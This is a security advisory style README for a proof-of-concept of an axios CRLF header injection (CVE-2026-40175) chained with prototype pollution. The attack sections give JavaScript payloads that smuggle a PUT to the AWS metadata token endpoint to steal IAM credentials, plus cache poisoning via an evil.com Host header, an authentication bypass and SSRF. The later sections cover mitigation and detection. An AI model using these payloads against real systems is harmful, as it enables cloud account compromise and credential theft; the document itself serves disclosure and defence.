# Axios CRLF Header Injection - Cloud Metadata Exfiltration POC

## CVE-2026-40175 / GHSA-fvcv-3m26-pcqx

**Severity:** 🔴 Critical (CVSS 9.9)  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`  
**Affected Versions:** axios < 0.31.0  
**Patched Version:** axios >= 0.31.0

## Vulnerability Summary

Axios is vulnerable to **HTTP Header Injection (CWE-113)** combined with **HTTP Request Smuggling (CWE-444)** that can be exploited when **any other library** in the application has a Prototype Pollution vulnerability.

### The Gadget Chain

1. **Attacker pollutes `Object.prototype`** via a vulnerability in another library (qs, minimist, body-parser, etc.)
2. **Axios merges prototype properties** into request headers during config merge
3. **No CRLF validation** allows injecting new HTTP headers/requests
4. **Result:** Full AWS cloud compromise via IMDSv2 bypass

### Why This Is Critical

- **Zero Direct User Input Required** - Developer code looks completely safe
- **Bypasses AWS IMDSv2** - Can steal IAM credentials from metadata service
- **Defeats Input Validation** - Pollution happens at prototype level
- **Weaponizes Safe Code** - Any axios request becomes an attack vector

## Technical Deep Dive

### Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ STEP 1: Prototype Pollution (in ANY library)                   │
│ ?__proto__[x-custom]=evil\r\nHost: 169.254.169.254             │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│ STEP 2: Application Makes Safe Request                         │
│ axios.get('https://api.internal/analytics')                     │
│ ↳ Developer validated URL, no user input                        │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│ STEP 3: Axios Merges Prototype Properties                      │
│ headers = {...defaultHeaders, ...Object.prototype, ...headers} │
│ ↳ x-custom header contains CRLF payload                         │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│ STEP 4: No CRLF Validation                                     │
│ socket.write('x-custom: evil\r\nHost: 169.254.169.254\r\n')    │
│ ↳ HTTP Request Smuggling occurs                                 │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│ STEP 5: Smuggled Request Reaches Target                        │
│ GET /latest/meta-data/iam/security-credentials/                 │
│ ↳ Returns AWS IAM credentials                                   │
└─────────────────────────────────────────────────────────────────┘
```

### The Payload

```javascript
// Attacker pollutes prototype (via query param, JSON body, etc.)
Object.prototype['x-amz-target'] = 
  "dummy\r\n" +
  "\r\n" +
  "PUT /latest/api/token HTTP/1.1\r\n" +
  "Host: 169.254.169.254\r\n" +
  "X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n" +
  "\r\n" +
  "GET /ignore";

// Developer makes completely safe request
await axios.get('https://analytics.internal/pings');
```

### The Result

```http
GET /pings HTTP/1.1
Host: analytics.internal
x-amz-target: dummy

PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

GET /ignore HTTP/1.1
... (rest of original headers)
```

The second request is a **smuggled request** that:
1. Bypasses IMDSv2 protection (requires PUT with special header)
2. Obtains a session token
3. Can then fetch IAM credentials
4. Results in full AWS account compromise

## Impact Scenarios

### 🔴 Critical: AWS IMDSv2 Bypass

**Impact:** Full cloud account compromise
- Steal EC2 IAM role credentials
- Escalate to other AWS services
- Exfiltrate sensitive data
- Pivot to other resources

**Why IMDSv2 Doesn't Protect:**
- IMDSv2 requires a PUT request to `/latest/api/token`
- Must include `X-aws-ec2-metadata-token-ttl-seconds` header
- Normal SSRF cannot send custom headers in the first request
- Request smuggling crafts the exact packet needed

### 🟠 High: Authentication Bypass

**Attack:**
```javascript
Object.prototype['x-inject'] = 
  "dummy\r\nAuthorization: Bearer stolen-admin-token";
```

**Result:** Bypass authentication on internal APIs

### 🟠 High: Cache Poisoning

**Attack:**
```javascript
Object.prototype['x-poison'] = 
  "dummy\r\nHost: evil.com\r\nX-Forwarded-Host: evil.com";
```

**Result:** Serve malicious content from CDN to all users

### 🟡 Medium: SSRF Chaining

**Attack:**
```javascript
Object.prototype['x-ssrf'] = 
  "\r\nGET /admin/secrets HTTP/1.1\r\nHost: internal-db:6379";
```

**Result:** Access internal services (Redis, MongoDB, etc.)

## Running the POC

### Prerequisites

```bash
npm install
```

### Execute POC

```bash
npm test
```

### What You'll See

The POC demonstrates:
1. Prototype pollution simulation
2. Test HTTP server to capture raw traffic
3. "Safe" axios request that triggers vulnerability
4. Analysis of the smuggled request
5. Real-world attack scenarios
6. Why common protections fail
7. Mitigation strategies

### Expected Output

```
======================================================================
Axios CRLF Header Injection - CVE-2026-40175
Cloud Metadata Exfiltration via Prototype Pollution Gadget Chain
======================================================================

[STEP 1] Simulating Prototype Pollution Attack
✓ Prototype pollution complete

[STEP 2] Test server started on http://localhost:8080

[STEP 3] Application Makes "Safe" Request
Code: axios.get("http://localhost:8080/api/analytics")
Note: This code looks completely safe - no user input!

[TEST SERVER] Received HTTP Request:
----------------------------------------------------------------------
GET /api/analytics HTTP/1.1
x-amz-target: dummy

PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
...
```

## Real-World Vulnerable Code

### Example 1: Express API

```javascript
// Vulnerable query parser (e.g., qs before patches)
app.use(require('body-parser').json());

// Completely safe-looking code
app.get('/api/external-data', async (req, res) => {
  // No user input here!
  const data = await axios.get('https://api.example.com/data');
  res.json(data);
});

// Attack: POST /?__proto__[x-evil]=<CRLF payload>
// Result: axios request is weaponized
```

### Example 2: Serverless Function

```javascript
// AWS Lambda handler
exports.handler = async (event) => {
  // Parse user input (vulnerable library)
  const config = parseConfig(event.queryStringParameters);
  
  // Safe hardcoded request
  const metrics = await axios.get('http://internal-metrics/stats');
  
  return { statusCode: 200, body: JSON.stringify(metrics) };
};

// If parseConfig pollutes prototype, axios is weaponized
```

## Why Common Mitigations Fail

### ❌ Input Validation

```javascript
// Developer validates all inputs
const url = validator.isURL(userInput) ? userInput : 'https://default.com';
await axios.get(url); // Still vulnerable!
```

**Why it fails:** Pollution happens at `Object.prototype`, not in validated input.

### ❌ Axios Prototype Pollution Patches

Axios has patched direct config pollution, but:
- Cannot prevent pollution from other libraries
- Axios becomes a "gadget" in the attack chain
- Similar to how RCE gadgets work in Java deserialization

### ❌ AWS IMDSv2

IMDSv2 requires:
1. PUT request to `/latest/api/token`
2. `X-aws-ec2-metadata-token-ttl-seconds` header
3. Then use token in subsequent requests

Request smuggling allows crafting the exact HTTP packet needed.

### ❌ Network Firewalls

If the application can reach ANY internal service:
- Smuggled requests can pivot to other IPs
- Single TCP connection carries multiple logical requests
- Firewall sees one outbound connection

## Mitigation

### Immediate Actions

#### 1. Update Axios (Primary Fix)

```bash
npm update axios
# or
npm install axios@^0.31.0
```

#### 2. Force Update Transitive Dependencies

If blocked by other packages (like bundlewatch):

**package.json:**
```json
{
  "overrides": {
    "axios": "^0.31.0"
  }
}
```

Or with yarn:
```json
{
  "resolutions": {
    "axios": "^0.31.0"
  }
}
```

#### 3. Runtime Header Validation (Temporary)

```javascript
const axios = require('axios');

// Add request interceptor
axios.interceptors.request.use(config => {
  // Validate all header values
  Object.entries(config.headers || {}).forEach(([key, value]) => {
    if (typeof value === 'string' && /[\r\n]/.test(value)) {
      throw new Error(
        `Security: Invalid character in header "${key}". ` +
        `Header values cannot contain CR/LF characters.`
      );
    }
  });
  return config;
});
```

#### 4. Freeze Object.prototype (Nuclear Option)

```javascript
// Prevents all prototype pollution
Object.freeze(Object.prototype);
// Warning: May break some libraries
```

### Long-Term Defense

#### 1. Fix All Prototype Pollution

```bash
# Audit dependencies
npm audit

# Use security scanning
npm install -g snyk
snyk test
```

#### 2. AWS IMDSv2 Hop Limit

```bash
# Prevent SSRF from reaching IMDS
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-put-response-hop-limit 1 \
    --http-tokens required
```

#### 3. Principle of Least Privilege

- Use IAM roles with minimum permissions
- Limit blast radius of credential theft
- Enable AWS GuardDuty for anomaly detection

#### 4. Network Segmentation

- Restrict what internal services apps can access
- Use VPC security groups
- Implement zero-trust networking

### For Bootstrap Users

Your bootstrap package has this dependency chain:
```
bootstrap@5.1.0
  └─ bundlewatch@0.4.1
      └─ axios@0.30.1 (VULNERABLE)
```

**Fix:**
```json
{
  "devDependencies": {
    "bootstrap": "^5.1.0"
  },
  "overrides": {
    "axios": "^0.31.0"
  }
}
```

Then:
```bash
rm -rf node_modules package-lock.json
npm install
```

## Detection

### Identify Vulnerable Versions

```bash
# Check if axios is vulnerable
npm ls axios

# If shows < 0.31.0, you're vulnerable
```

### Runtime Detection

Monitor for suspicious HTTP traffic:
- Requests with CRLF in headers
- Unexpected HTTP methods (PUT to IMDS)
- Multiple HTTP requests in single TCP connection

### AWS CloudTrail

Monitor for:
- Unusual IAM credential usage
- API calls from unexpected IPs
- Sudden spike in EC2 metadata service access

## References

- **CVE:** CVE-2026-40175
- **GHSA:** GHSA-fvcv-3m26-pcqx
- **CWE-113:** Improper Neutralization of CRLF Sequences in HTTP Headers
- **CWE-444:** Inconsistent Interpretation of HTTP Requests (Request Smuggling)
- **CWE-918:** Server-Side Request Forgery (SSRF)
- **OWASP:** [CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
- **AWS:** [IMDSv2 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)

## Credits

POC created for educational and security research purposes.

## Disclaimer

This proof-of-concept is provided for educational and security research purposes only. Use only on systems you own or have explicit permission to test.

Do not use this to:
- Attack systems you don't own
- Exploit vulnerabilities without authorization  
- Cause harm or disruption

Always follow responsible disclosure practices.
